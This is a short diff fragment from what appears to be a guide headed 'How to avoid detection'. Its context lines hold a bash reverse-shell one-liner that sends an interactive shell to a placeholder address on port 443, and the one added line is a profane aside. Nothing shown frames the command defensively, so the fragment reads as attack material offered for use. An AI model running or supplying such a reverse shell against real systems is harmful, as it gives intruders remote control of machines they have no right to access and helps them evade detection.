@@ -8,3 +8,4 @@ How to avoid detection
 bash -i >& /dev/tcp/your.ip/443 0>&1
 ```
 
+fuck it's easier than writing here
